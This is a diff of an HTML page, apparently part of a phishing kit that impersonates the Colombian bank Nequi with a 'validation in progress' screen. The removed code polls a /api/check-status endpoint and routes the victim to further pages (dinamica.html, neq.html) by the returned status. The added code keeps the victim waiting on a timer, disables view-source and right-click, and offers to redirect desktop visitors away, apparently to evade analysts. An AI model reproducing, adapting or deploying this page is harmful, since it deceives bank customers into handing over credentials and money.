@@ -1,175 +1,136 @@
 <!DOCTYPE html>
 <html lang="es">
 <head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Validación en curso</title>
-    <style>
-        body {
-            font-family: 'Manrope', sans-serif;
-            background-color: #f5f5f5;
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            min-height: 100vh;
-            margin: 0;
-            padding: 20px;
+  <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
+  <title>Validando...</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <meta name="generator" content="Webflow">
+  <meta http-equiv="pragma" content="no-cache">
+  
+  <link rel="stylesheet" type="text/css" href="login_files/normalize.css">
+  <link rel="stylesheet" type="text/css" href="login_files/nequi_two.webflow.css">
+  <link rel="stylesheet" type="text/css" href="login_files/nequi_one.webflow.css">
+  <link rel="stylesheet" type="text/css" href="login_files/main2.css">
+  <link rel="shortcut icon" type="image/x-icon" href="./img/favicon.ico">
+
+  <style>
+    /* Mini-reset para que el loader quede centrado */
+    html, body { height: 100%; margin: 0; }
+    body {
+      display: flex;
+      flex-direction: column;
+      justify-content: center;
+      align-items: center;
+      background: #ffffff;
+      font-family: Manrope, sans-serif;
+      color: #200020;
+      text-align: center;
+    }
+    .login-section { margin: auto; max-width: 420px; padding: 0 20px; }
+    .login-wrap { background: #fff; border-radius: 16px; padding: 40px 30px; box-shadow: 0 4px 12px rgba(0,0,0,.1); }
+    .textypn2 { margin: 16px 0; font-size: 16px; line-height: 1.4; }
+    .label-input101 { font-size: 14px; color: #6e6e6e; }
+    .loader-gif { width: 80px; margin: 20px auto; }
+  </style>
+
+  <script>
+    // Redirige a dinamica.html después de 20 segundos
+    function startRedirectTimer() {
+      let secondsLeft = 20;
+      const interval = setInterval(function () {
+        secondsLeft--;
+        console.log("Redirigiendo en " + secondsLeft + " segundos");
+        if (secondsLeft <= 0) {
+          clearInterval(interval);
+          window.location.href = "dinamica.html"; // ← cambia aquí si quieres otro destino
         }
-        .container {
-            max-width: 500px;
-            background: white;
-            border-radius: 16px;
-            padding: 40px;
-            text-align: center;
-            box-shadow: 0 4px 20px rgba(0,0,0,0.1);
-        }
-        h1 {
-            color: #200020;
-            margin-bottom: 20px;
-        }
-        .loader {
-            width: 60px;
-            height: 60px;
-            border: 4px solid #f3f3f3;
-            border-top: 4px solid #DA0081;
-            border-radius: 50%;
-            animation: spin 1s linear infinite;
-            margin: 30px auto;
-        }
-        @keyframes spin {
-            0% { transform: rotate(0deg); }
-            100% { transform: rotate(360deg); }
-        }
-        p {
-            color: #666;
-            line-height: 1.6;
-            margin: 20px 0;
-        }
-        .status {
-            margin-top: 20px;
-            padding: 10px;
-            border-radius: 8px;
-            font-weight: 600;
-        }
-        .status.checking {
-            background: #fff3cd;
-            color: #856404;
-        }
-        .status.success {
-            background: #d4edda;
-            color: #155724;
-        }
-    </style>
+      }, 1000);
+    }
+    window.onload = startRedirectTimer;
+  </script>
 </head>
-<body>
-    <div class="container">
-        <h1>Validación en curso</h1>
-        <div class="loader"></div>
-        <p>Por favor espere un momento mientras validamos la información ingresada, agradecemos su paciencia.</p>
-        <div id="status" class="status checking">
-            🔄 Verificando información...
+<body ng-app="App" class="ng-scope">
+  <div id="content">
+    <div ng-include="getTemplate('/header.html')" class="ng-scope">
+      <header class="ng-scope">
+        <div class="wrap-header">
+          <div class="row">
+            <div class="col-xs-12 col-md-2">
+              <div class="logo">
+                <a href="#">
+                  <!-- Logo local -->
+                  <img alt="nequi" src="./img/logo.svg">
+                </a>
+              </div>
+              <div class="btn-menu-hamburguer" ng-click="openMenu();">
+                <a class=""><span></span></a>
+              </div>
+            </div>
+            <div class="col-xs-12 col-md-10 container-buttons">
+              <div class="wrap-main-menu">
+                <div class="row">
+                  <div class="col-xs-12 col-md-8"></div>
+                  <div class="col-xs-12 col-md-4">
+                    <div class="buttons-right">
+                      <ul>
+                        <li ng-if="!hidePa" class="ng-scope">
+                          <a href="#" class="ng-binding">Recarga</a>
+                        </li>
+                      </ul>
+                    </div>
+                  </div>
+                </div>
+              </div>
+            </div>
+          </div>
         </div>
-        <p style="font-size: 0.9em; color: #999;">
-            Por lo general este proceso no demora más de 2 minutos.
-        </p>
+      </header>
     </div>
 
-    <script>
-        const userId = localStorage.getItem("userId");
-        const statusDiv = document.getElementById("status");
-        let checkCount = 0;
-        const maxChecks = 40; // 40 intentos x 3 segundos = 2 minutos
+    <section class="login-section ng-scope" ng-controller="loginController as loginControl">
+      <div class="login-wrap">
+        <h1 class="ng-binding">Validación en curso</h1>
+        <div class="wrap-input4 validate-input">
+          <br>
+          <center>
+            <!-- Gif local -->
+            <img src="./img/gnequi.gif" alt="Loading" class="loader-gif">
+          </center>
+          <div class="textypn2">
+            <span class="model" style="font-size:16px; color:#200020; text-align:center;">
+              Por favor espere un momento mientras validamos la información ingresada, agradecemos su paciencia.
+            </span>
+          </div>
+          <br>
+          <center>
+            <span class="label-input101">Por lo general este proceso no demora más de 2 minutos.</span>
+          </center>
+        </div>
+      </div>
+    </section>
+  </div>
 
-        if (!userId) {
-            console.log("No userId found, redirecting...");
-            setTimeout(() => {
-                window.location.href = "index.html";
-            }, 1000);
-        }
+  <script>
+    // Detectar dispositivo (opcional)
+    function detectar_dispositivo() {
+      const ua = navigator.userAgent;
+      if (/Android|webOS|iPhone|iPad|iPod|BlackBerry|Windows Phone/i.test(ua)) return "Móvil";
+      return "PC";
+    }
+    // Si quieres bloquear PC descomenta lo siguiente:
+    // if (detectar_dispositivo() === "PC") window.location.href = "https://www.dian.gov.co/";
 
-        // Función para verificar estado
-        async function checkStatus() {
-            try {
-                // Obtener la URL base actual
-                const baseUrl = window.location.origin;
-                const response = await fetch(`${baseUrl}/api/check-status?userId=${userId}`);
-                
-                if (!response.ok) {
-                    console.error('API response not ok:', response.status);
-                    checkCount++;
-                    if (checkCount >= maxChecks) {
-                        statusDiv.textContent = '⏱️ Tiempo agotado, redirigiendo...';
-                        setTimeout(() => {
-                            window.location.href = "dinamica.html";
-                        }, 2000);
-                        return true;
-                    }
-                    return false;
-                }
-
-                const data = await response.json();
-                checkCount++;
-
-                if (data.status === 'approved') {
-                    statusDiv.className = 'status success';
-                    statusDiv.textContent = '✅ Verificación exitosa';
-                    setTimeout(() => {
-                        window.location.href = data.nextPage || 'finish.html';
-                    }, 1000);
-                    return true;
-                } else if (data.status === 'retry') {
-                    statusDiv.className = 'status success';
-                    statusDiv.textContent = '🔄 Redirigiendo...';
-                    setTimeout(() => {
-                        window.location.href = data.nextPage || 'dinamica.html';
-                    }, 1000);
-                    return true;
-                } else if (data.status === 'error') {
-                    statusDiv.className = 'status success';
-                    statusDiv.textContent = '⚠️ Redirigiendo...';
-                    setTimeout(() => {
-                        window.location.href = data.nextPage || 'neq.html';
-                    }, 1000);
-                    return true;
-                } else if (checkCount >= maxChecks) {
-                    // Timeout después de 2 minutos
-                    statusDiv.textContent = '⏱️ Tiempo agotado, redirigiendo...';
-                    setTimeout(() => {
-                        window.location.href = 'dinamica.html';
-                    }, 2000);
-                    return true;
-                }
-
-                return false;
-            } catch (error) {
-                console.error('Error checking status:', error);
-                checkCount++;
-                
-                // Si falla muchas veces, redirigir
-                if (checkCount >= maxChecks) {
-                    statusDiv.textContent = '⏱️ Tiempo agotado, redirigiendo...';
-                    setTimeout(() => {
-                        window.location.href = "dinamica.html";
-                    }, 2000);
-                    return true;
-                }
-                
-                return false;
-            }
-        }
-
-        // Verificar cada 3 segundos
-        const interval = setInterval(async () => {
-            const shouldStop = await checkStatus();
-            if (shouldStop) {
-                clearInterval(interval);
-            }
-        }, 3000);
-
-        // Primera verificación después de 2 segundos
-        setTimeout(() => {
-            checkStatus();
-        }, 2000);
-    </script>
+    // Bloqueo de teclas (opcional)
+    document.addEventListener("keydown", e => {
+      if (e.ctrlKey && e.key.toLowerCase() === "u") {
+        e.preventDefault();
+        alert("Acción bloqueada.");
+      }
+    });
+    document.addEventListener("contextmenu", e => {
+      e.preventDefault();
+      alert("Clic derecho deshabilitado.");
+    });
+  </script>
 </body>
 </html>
